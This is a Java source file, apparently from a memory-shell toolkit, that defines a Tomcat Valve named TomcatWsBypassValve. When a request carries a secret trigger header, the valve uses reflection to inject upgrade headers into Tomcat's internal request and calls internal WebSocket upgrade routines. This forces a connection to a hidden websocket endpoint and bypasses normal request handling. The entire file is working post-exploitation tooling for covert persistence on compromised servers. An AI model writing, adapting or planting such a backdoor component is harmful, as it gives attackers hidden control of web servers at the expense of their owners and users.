package com.reajason.javaweb.memshell.shelltool.wsbypass;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletException;
import javax.websocket.server.ServerContainer;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author ReaJason
 * @since 2026/1/13
 */
public class TomcatWsBypassValve implements Valve {
    public static String headerName;
    public static String headerValue;

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            if (request.getHeader(headerName) != null
                    && request.getHeader(headerName).contains(headerValue)) {
                String pathInfo = request.getPathInfo();
                String path;
                if (pathInfo == null) {
                    path = request.getServletPath();
                } else {
                    path = request.getServletPath() + pathInfo;
                }
                Object sc = request.getServletContext().getAttribute(ServerContainer.class.getName());
                if (sc == null) {
                    throw new ServletException("Server container not found");
                }
                Object mappingResult = sc.getClass().getMethod("findMapping", String.class).invoke(sc, path);
                Class<?> upgradeUtil = Class.forName("org.apache.tomcat.websocket.server.UpgradeUtil");
                for (Method method : upgradeUtil.getMethods()) {
                    if ("doUpgrade".equals(method.getName())) {
                        addHeader(request, "Connection", "upgrade");
                        addHeader(request, "Upgrade", "websocket");
                        method.invoke(null, sc, request, response, getFieldValue(mappingResult, "config"), getFieldValue(mappingResult, "pathParams"));
                    }
                }
                return;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        this.getNext().invoke(request, response);
    }

    private Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field declaredField = obj.getClass().getDeclaredField(fieldName);
        declaredField.setAccessible(true);
        return declaredField.get(obj);
    }

    private void addHeader(Request request, String key, String value) {
        try {
            Field coyoteRequestField = request.getClass().getDeclaredField("coyoteRequest");
            coyoteRequestField.setAccessible(true);
            Object coyoteRequest = coyoteRequestField.get(request);
            Method getMimeHeadersMethod = coyoteRequest.getClass().getMethod("getMimeHeaders");
            Object mimeHeaders = getMimeHeadersMethod.invoke(coyoteRequest);
            Method addValueMethod = mimeHeaders.getClass().getMethod("addValue", String.class);
            Object messageBytes = addValueMethod.invoke(mimeHeaders, key);
            Method setStringMethod = messageBytes.getClass().getMethod("setString", String.class);
            setStringMethod.invoke(messageBytes, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    Valve next;

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return false;
    }

    @Override
    public void backgroundProcess() {
    }
}
